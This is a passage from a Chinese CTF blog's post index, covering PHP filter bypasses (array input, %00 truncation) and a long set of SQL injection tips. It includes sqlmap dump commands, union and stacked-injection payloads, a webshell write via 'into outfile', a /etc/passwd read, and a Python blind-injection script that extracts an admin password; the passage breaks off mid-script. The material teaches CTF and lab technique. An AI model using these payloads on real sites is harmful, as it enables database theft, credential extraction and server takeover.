class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">echo</span> <span class="token string">'骚年，继续努力吧啊~'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>payload<br><code>?ctf[]=1</code></p><h4 id="4-7、00截断正则-也可以数组绕过"><a href="#4-7、00截断正则-也可以数组绕过" class="headerlink" title="4.7、00截断正则/也可以数组绕过"></a>4.7、00截断正则/也可以数组绕过</h4><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;p>You password must be alphanumeric&lt;/p>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token markup">&lt; 8 &amp;&amp; $_GET['password'] ></span> <span class="token number">9999999</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'*-*'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">'&lt;p>*-* have not been found&lt;/p>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;p>Invalid password&lt;/p>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>payload</p><pre><code>1-利用数组绕过这两个函数?password[]=12-%00截断绕过正则匹配?password=1e9%00*-*</code></pre><h4 id="4-7、is-number"><a href="#4-7、is-number" class="headerlink" title="4.7、is_number"></a>4.7、is_number</h4><p>[极客大挑战 2019]BuyFlag</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"password can't be number&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Password Right!&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>payload<br><code>password=404</code>(后面加一个空格)</p><h3 id="tps-00"><a href="#tps-00" class="headerlink" title="tps:%00"></a>tps:%00</h3><p>文件包含是否支持%00截断取决于：<br>PHP版本&lt;=5.2 可以使用%00进行截断。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的一些tip</title>
      <link href="/2019/11/22/sql-zhu-ru-de-yi-xie-tip/"/>
      <url>/2019/11/22/sql-zhu-ru-de-yi-xie-tip/</url>
      
        <content type="html"><![CDATA[<h4 id="一-基础语句"><a href="#一-基础语句" class="headerlink" title="一:基础语句"></a>一:基础语句</h4><pre class=" language-mysql"><code class="language-mysql">show databases;         //查看数据库use xxx;                //使用某个数据库show tables;            //查看该数据库的数据表desc xxx;               //查看该数据表的结构select * from xxx;      //查找某个数据表的所有内容select schema_name from information_schema.schemata;        //猜数据库select table_name from information_schema.tables where table_schema='xxxxx';                                //猜某数据库的数据表Select column_name from information_schema.columns where table_name='xxxxx';                                //猜某表的所有列left(a,b)       //从左侧截取 a 的前 b 位mid(column_name,start[,length])     //从位置start开始，截取column_name字符串的length位，与substr作用相同substr(string, start, length)       //从位置start开始，截取字符串string的length长度，与mid作用相同ascii()         //将某个字符转换成ascii码ord()           //将某个字符转换成ascii码，同ascii()select database() //当前数据库concat()  //能将一些字符串连接一个字符串适用于一条数据group_concat() //能够将一张表的数据的一些数据分组合并起来，适用性比较广show @@basedir; //显示文件根目录select load_file('/ect/passwd'); //读文件 需要开secure-file-priv='/'select '<?php @eval($_post["mima"])?>' into outfile "位置" //写文件user(); //当前用户</code></pre><a id="more"></a><h3 id="二、sqlmap使用"><a href="#二、sqlmap使用" class="headerlink" title="二、sqlmap使用"></a>二、sqlmap使用</h3><p>github地址为<a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a>，功能参考书<a href="https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap%E6%95%99%E7%A8%8B.pdf" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Book/sqlmap教程.pdf</a></p><h4 id="一些常用使用命令"><a href="#一些常用使用命令" class="headerlink" title="一些常用使用命令"></a>一些常用使用命令</h4><h5 id="1、是否能注入"><a href="#1、是否能注入" class="headerlink" title="1、是否能注入"></a>1、是否能注入</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;</code></pre><h5 id="2、获取所有的数据库"><a href="#2、获取所有的数据库" class="headerlink" title="2、获取所有的数据库"></a>2、获取所有的数据库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --dbs</code></pre><h5 id="3、当前库"><a href="#3、当前库" class="headerlink" title="3、当前库"></a>3、当前库</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db</code></pre><h5 id="4、查询某数据库的所有表（比如security）"><a href="#4、查询某数据库的所有表（比如security）" class="headerlink" title="4、查询某数据库的所有表（比如security）"></a>4、查询某数据库的所有表（比如security）</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;  -D security --tables</code></pre><h5 id="5、暴力查询所有的表"><a href="#5、暴力查询所有的表" class="headerlink" title="5、暴力查询所有的表"></a>5、暴力查询所有的表</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   --tables</code></pre><h5 id="6、列出security库中users表中的所有列"><a href="#6、列出security库中users表中的所有列" class="headerlink" title="6、列出security库中users表中的所有列"></a>6、列出security库中users表中的所有列</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users --columns</code></pre><p>(-D dbname指定数据库名称、-T tablename：指定某数据表的名称、–columns：列出指定表上的所有列)</p><h5 id="7、导出三个数据列中所有的数据"><a href="#7、导出三个数据列中所有的数据" class="headerlink" title="7、导出三个数据列中所有的数据"></a>7、导出三个数据列中所有的数据</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot;   -D security -T users -C id,username,password --dump</code></pre><h5 id="8、提供一个sql-shell"><a href="#8、提供一个sql-shell" class="headerlink" title="8、提供一个sql shell"></a>8、提供一个sql shell</h5><pre><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --sql-shell</code></pre><h5 id="9、post"><a href="#9、post" class="headerlink" title="9、post"></a>9、post</h5><pre><code>python sqlmap.py -u 登录的地址 --data &quot;userid=aaa&amp;passwd=bbbb&quot;</code></pre><h5 id="10、添加前缀"><a href="#10、添加前缀" class="headerlink" title="10、添加前缀"></a>10、添加前缀</h5><pre><code>--prefix=&quot;%1$\&#39;&quot; -p username</code></pre><pre><code>--cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot;</code></pre><pre><code>sqlmap -u &quot;http://web59.buuoj.cn/admin.php?id=4&quot; --cookie=&quot;PHPSESSID=cf49a9a60da9cc1b547ab98d549ba038&quot; -T flag --dump --flush-session --fresh-queries --fresh-queries --delay 0.1</code></pre><h4 id="sqlilabs搭建"><a href="#sqlilabs搭建" class="headerlink" title="sqlilabs搭建"></a>sqlilabs搭建</h4><pre><code>docker pull acgpiano/sqli-labsdocker run -dt --name sqli-lab -p [你要映射的端口]:80 acgpiano/sqli-labs:latest</code></pre><h3 id="三、注释问题"><a href="#三、注释问题" class="headerlink" title="三、注释问题"></a>三、注释问题</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p><h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p><pre><code>id=1%27--%20</code></pre><h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p><h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p><pre><code>SBUSTR(str,pos); </code></pre><p>就是从pos开始的位置，一直截取到最后。</p><pre><code>SUBSTR(str,pos,len);</code></pre><p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p><h4 id="4-2、ascii-ord-函数"><a href="#4-2、ascii-ord-函数" class="headerlink" title="4.2、ascii(),ord()函数"></a>4.2、ascii(),ord()函数</h4><p>ASCII(str1)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p><pre><code>mysql&gt; select ascii(&quot;a&quot;);+------------+| ascii(&quot;a&quot;) |+------------+|         97 |+------------+1 row in set (0.00 sec)</code></pre><p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p><pre><code>mysql&gt; select ord(&quot;a&quot;);+----------+| ord(&quot;a&quot;) |+----------+|       97 |+----------+1 row in set (0.00 sec)</code></pre><h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><pre><code>LEFT(str,length);</code></pre><p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p><pre><code>mysql&gt; select left(&quot;hello Kitty&quot;,5);+-----------------------+| left(&quot;hello Kitty&quot;,5) |+-----------------------+| hello                 |+-----------------------+1 row in set (0.00 sec)</code></pre><p>与之类似的是right(str,length);</p><pre><code>mysql&gt; select right(&quot;hello Kitty&quot;,5);+------------------------+| right(&quot;hello Kitty&quot;,5) |+------------------------+| Kitty                  |+------------------------+1 row in set (0.00 sec)</code></pre><h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p><pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39;;+------------------------------+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39; |+------------------------------+|                            0 |+------------------------------+1 row in set (0.00 sec)</code></pre><pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39;;+------------------------------+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39; |+------------------------------+|                            1 |+------------------------------+1 row in set (0.00 sec)</code></pre><h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><pre><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></pre><p>函数用于从文本字段中提取字符。</p><pre><code>+----+--------------+---------------------------+-------+---------+| id | name         | url                       | alexa | country |+----+--------------+---------------------------+-------+---------+| 1  | Google       | https://www.google.cm/    | 1     | USA     || 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      || 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      || 4  | 微博          | http://weibo.com/         | 20    | CN      || 5  | Facebook      | https://www.facebook.com/ | 3     | USA     || 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |+----+---------------+---------------------------+-------+---------+</code></pre><pre><code>SELECT MID(name,1,4) AS ShortTitleFROM Websites;</code></pre><p>返回结果<br><img src="13.png" alt=""></p><h4 id="4-6、if"><a href="#4-6、if" class="headerlink" title="4.6、if()"></a>4.6、if()</h4><p> 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p><p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p><pre><code>mysql&gt; select name,if(sex=0,&#39;女&#39;,&#39;男&#39;) as sex from student;+-------+-----+| name  | sex |+-------+-----+| name1 | 女  || name2 | 女  || name3 | 男  || name4 | 女  |+-------+-----+rows in set (0.00 sec)</code></pre><h3 id="五、sprintf格式化字符串带来的注入隐患"><a href="#五、sprintf格式化字符串带来的注入隐患" class="headerlink" title="五、sprintf格式化字符串带来的注入隐患"></a>五、sprintf格式化字符串带来的注入隐患</h3><p>语句</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token string">"%1$' and 1=1#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"AND b='%s'"</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM t WHERE a='%s' $b"</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span></code></pre><p>通过fuzz得知，在php的格式化字符串中，%后的一个字符(除了’%’)会被当作字符类型，而被吃掉，单引号’，斜杠\也不例外。</p><p>如果能提前将%’ and 1=1#拼接入sql语句，若存在SQLi过滤，单引号会被转义成&#39;</p><pre><code>select * from user where username = &#39;%\&#39; and 1=1#&#39;;</code></pre><p>然后这句sql语句如果继续进入格式化字符串，\会被%吃掉，’成功逃逸</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '%\' and 1=1#';"</span><span class="token punctuation">;</span><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$args</span> <span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//result: select * from user where username = '' and 1=1#'</span><span class="token delimiter">?></span></code></pre><p>还可以使用%1$吃掉后面的斜杠，而不引起报错</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from user where username = '%1$\' and 1=1#' and password='%s';"</span><span class="token punctuation">;</span><span class="token variable">$args</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span> <span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token comment" spellcheck="true">//result: select * from user where username = '' and 1=1#' and password='admin';</span><span class="token delimiter">?></span></code></pre><p>具体题目为下方的迎圣诞，拿大奖”活动赛题sqli</p><h3 id="六、题目经典payload"><a href="#六、题目经典payload" class="headerlink" title="六、题目经典payload"></a>六、题目经典payload</h3><pre><code>-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23-1&#39; union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h3 id="“百度杯”CTF比赛-九月场SQLi-过滤了逗号"><a href="#“百度杯”CTF比赛-九月场SQLi-过滤了逗号" class="headerlink" title="“百度杯”CTF比赛 九月场SQLi-过滤了逗号"></a>“百度杯”CTF比赛 九月场SQLi-过滤了逗号</h3><pre><code>id=1&#39; union select * from (select database()) a join (select version() ) b %23</code></pre><h3 id="过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作"><a href="#过滤了空格，逗号，等号，for，and等的盲注，使用-mid函数骚操作" class="headerlink" title="过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作"></a>过滤了空格，逗号，等号，for，and等的盲注，使用^mid函数骚操作</h3><p>空格用括号代替，等号用&lt;&gt;(一种不等号)代替<br>异或运算^代替and</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsstr_all<span class="token operator">=</span><span class="token string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/="</span>url<span class="token operator">=</span><span class="token string">"http://123.206.31.85:49167/index.php"</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> str_all<span class="token punctuation">:</span>            payload<span class="token operator">=</span><span class="token string">"admin'^(ascii(mid(database()from({})))&lt;>{})^0#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span>            <span class="token punctuation">}</span>            s<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"error"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                result<span class="token operator">+=</span>j                flag<span class="token operator">=</span><span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'**************************'</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token keyword">def</span> <span class="token function">password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    result<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> str_all<span class="token punctuation">:</span>            payload <span class="token operator">=</span> <span class="token string">"admin'^(ascii(mid((select(password)from(admin))from({})))&lt;>{})^0#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            data <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>                <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span>            <span class="token punctuation">}</span>            s<span class="token operator">=</span>r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"error"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                result<span class="token operator">+=</span>j                flag<span class="token operator">=</span><span class="token number">1</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'**************************'</span><span class="token punctuation">,</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span><span class="token comment" spellcheck="true">#database()</span>password<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>mid()函数和substring()一样，一种写法是mid(xxx,1,1)，另一种是mid(xxx from 1 for 1)但是这里过滤了for和逗号，那么怎么办呢？<br>这里用到了ascii()取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。<br>每个字符的ascii码判断是不是不等于给定的数字，会得到一个布尔值(0或1)再与结尾的0进行运算。<br>如果数据库名的第一位的ascii码值不是97，where条件是<code>username=&#39;admin&#39;^1^0</code></p><h3 id="强网杯-2019-随便注-堆叠注入"><a href="#强网杯-2019-随便注-堆叠注入" class="headerlink" title="[强网杯 2019]随便注-堆叠注入"></a>[强网杯 2019]随便注-堆叠注入</h3><p>条件苛刻</p><pre><code>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</code></pre><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">databases</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#</span><span class="token number">0</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">columns</span> <span class="token keyword">from</span> <span class="token punctuation">`</span><span class="token number">1919810931114514</span><span class="token punctuation">`</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>(翻博客发现数字串为表名的表操作时要加反引号，加上之后发现的确有flag字段)<br>理论上我们执行<br><code>0&#39;;select flag,1 from 1919810931114514</code><br>但是这题的select被过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>也可以<br><code>-1&#39;;use supersqli;show tables;--</code><br>直接获取flag<br><code>1&#39;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</code><br>其中<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>加密为select * from `1919810931114514’<br>相关知识</p><pre><code>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</code></pre><p>还有骚操作是改表段然后注入获得数据</p><pre><code>0&#39;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</code></pre><h3 id="“百度杯”CTF比赛-九月场-SQL"><a href="#“百度杯”CTF比赛-九月场-SQL" class="headerlink" title="“百度杯”CTF比赛 九月场 SQL"></a>“百度杯”CTF比赛 九月场 SQL</h3><p>题目描述：<br><code>出题人就告诉你这是个注入，有种别走！</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,4,3</code>，学到了学到了&lt;&gt;分离<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,database(),3</code><br>获得数据库名字sqli然后一步一步<br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,column_name,3 from information_schema.columns where table_schema=&#39;sqli&#39; an&lt;&gt;d table_name=&#39;info&#39;</code><br><code>http://2733aeef10c94e969b49b24dd9e8a99bbdd989b14f4e482e.changame.ichunqiu.com/index.php?id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</code><br>得到flag</p><h3 id="盲注模板“迎圣诞，拿大奖”活动赛题sqli"><a href="#盲注模板“迎圣诞，拿大奖”活动赛题sqli" class="headerlink" title="盲注模板“迎圣诞，拿大奖”活动赛题sqli"></a>盲注模板“迎圣诞，拿大奖”活动赛题sqli</h3><p>模板</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding:utf8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> sys<span class="token comment" 